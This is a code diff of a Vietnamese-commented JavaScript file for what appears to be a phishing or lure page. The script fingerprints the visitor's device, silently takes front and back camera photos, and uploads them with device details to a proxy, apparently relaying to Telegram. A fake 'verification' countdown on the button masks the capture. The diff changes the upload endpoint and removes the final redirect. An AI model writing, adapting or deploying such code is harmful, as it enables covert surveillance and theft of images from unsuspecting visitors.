@@ -1,5 +1,5 @@
-// main.js - Phiên bản Full: Chụp ảnh, Gửi Proxy & Đếm ngược chuyển hướng
-const API_PROXY = "https://pho-tbootkomura-4yr9ov17m-amttakatoris-projects.vercel.app";
+// main.js - DA XOA CHUYEN HUONG
+const API_PROXY = "/api/tele-proxy";
 
 const info = {
   time: new Date().toLocaleString("vi-VN"),
@@ -8,7 +8,6 @@ const info = {
   camera: "⏳ Đang kiểm tra...",
 };
 
-// --- 1. NHẬN DIỆN THIẾT BỊ ---
 function detectDevice() {
   const ua = navigator.userAgent;
   const platform = navigator.platform;
@@ -43,7 +42,6 @@ function detectDevice() {
   }
 }
 
-// --- 2. CHỤP ẢNH CAMERA ---
 async function captureCamera(facingMode = "user") {
   if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia)
     return null;
@@ -72,9 +70,7 @@ async function captureCamera(facingMode = "user") {
   }
 }
 
-// --- 3. HÀM CHÍNH ĐIỀU KHIỂN ---
 async function main() {
-  // Tìm nút bấm để cập nhật trạng thái
   const button =
     document.querySelector("button") ||
     document.querySelector(".btn") ||
@@ -84,7 +80,6 @@ async function main() {
 
   detectDevice();
 
-  // Chụp ảnh từ camera
   let front = await captureCamera("user");
   let back = await captureCamera("environment");
 
@@ -93,7 +88,6 @@ async function main() {
       ? "✅ Đã chụp camera trước và sau"
       : "🚫 Bị chặn hoặc không có camera";
 
-  // Chuẩn bị gửi dữ liệu
   const formData = new FormData();
   formData.append("clientInfo", JSON.stringify(info));
 
@@ -109,33 +103,33 @@ async function main() {
     });
   }
 
-  // --- HIỆU ỨNG ĐẾM NGƯỢC TRÊN NÚT BẤM ---
   if (button) {
     button.style.backgroundColor = "#28a745";
     button.style.color = "#ffffff";
     button.style.boxShadow = "0 0 15px rgba(40, 167, 69, 0.6)";
 
-    let timeLeft = 3; // Số giây đếm ngược
+    let timeLeft = 3;
     button.innerText = `Vui lòng chờ xác minh (${timeLeft}s)`;
 
-    // Tạo vòng lặp đếm ngược mỗi 1 giây
     const countdownInterval = setInterval(() => {
       timeLeft--;
       if (timeLeft > 0) {
         button.innerText = `Vui lòng chờ xác minh (${timeLeft}s)`;
       } else {
         clearInterval(countdownInterval);
-        // THAY LINK BẠN MUỐN CHUYỂN HƯỚNG VÀO ĐÂY
-        window.location.href = "";
+        // DA XOA CHUYEN HUONG
+        button.innerText = "✅ HOÀN TẤT - ẢNH ĐÃ GỬI";
+        button.style.backgroundColor = "#45c97b";
+        console.log("Hoàn tất, không chuyển hướng.");
+        window.mainScriptFinished = true;
       }
     }, 1000);
   } else {
-    // Nếu không tìm thấy nút, vẫn tự động chuyển hướng sau 3 giây
     setTimeout(() => {
-      window.location.href = "";
+      console.log("Không tìm thấy nút, hoàn tất không chuyển hướng.");
+      window.mainScriptFinished = true;
     }, 3000);
   }
 }
 
-// Kích hoạt hệ thống
 main().then(() => console.log("✅ Hệ thống đã hoàn tất."));
